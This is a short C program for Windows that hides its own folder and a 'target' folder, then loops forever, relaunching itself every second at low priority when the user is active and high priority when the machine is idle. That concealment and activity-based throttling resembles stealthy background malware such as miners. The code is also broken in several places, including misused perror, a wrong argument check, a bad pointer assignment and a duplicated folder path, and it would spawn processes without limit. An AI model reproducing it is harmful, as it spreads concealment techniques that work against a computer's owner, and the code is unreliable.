#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void setFolderHidden(const char *folderPath);

/**
 * setFolderHidden - hides Folder in dir.
 * @folderPath: path to folder.
*/
void setFolderHidden(const char *folderPath)
{
	DWORD attributes = GetFileAttributesA(folderPath);
	if (attributes != INVALID_FILE_ATTRIBUTES)
	{
		/*Add the FILE_ATTRIBUTE_HIDDEN flag to make the folder hidden.*/
		attributes |= FILE_ATTRIBUTE_HIDDEN;
		SetFileAttributesA(folderPath, attributes);
	}
}

int main(int argc, char **argv)
{
	char currentDir[MAX_PATH];
	char targetDir[MAX_PATH];

	if (argc < 1)
	{
		perror("Usage: %s <PATH>", argv[0]);
		exit(EXIT_FAILURE);
	}

	/*Get the path of the currently running program.*/
	GetModuleFileName(NULL, currentDir, MAX_PATH);

	/*Replace "your_program_to_start.exe" with the name of the targeted program.*/
	const char *targetProgramName = *argv[1];

	/*Find the path to the folder containing the targeted program.*/
	GetModuleFileName(NULL, targetDir, MAX_PATH);
	char *lastBackslash = strrchr(targetDir, '\\');
	if (lastBackslash != NULL)
	{
		/*Remove the program name to get the parent folder.*/
		*lastBackslash = '\0';
	}

	/*Hide the current folder and the folder containing the targeted program.*/
	setFolderHidden(currentDir);
	setFolderHidden(targetDir);

	printf("Folders are now hidden.\n");

	// Check system idle time.
	LASTINPUTINFO lii;
	lii.cbSize = sizeof(LASTINPUTINFO);
	DWORD lastInput = 0;

	while (1)
	{
		if (GetLastInputInfo(&lii))
		{
			if (lastInput != lii.dwTime)
			{
				/*Computer is in use. Run the program in the background with 25% resources.*/
				char cmd[256];
				snprintf(cmd, sizeof(cmd), "start /B /low \"%s\"", currentDir);
				system(cmd);
			}
			else
			{
				/*Computer is idle. Run the program in the background with 75% resources.*/
				char cmd[256];
				snprintf(cmd, sizeof(cmd), "start /B /high \"%s\"", currentDir);
				system(cmd);
			}
			lastInput = lii.dwTime;
		}
		/*Check every second.*/
		Sleep(1000);
	}

	return 0;
}
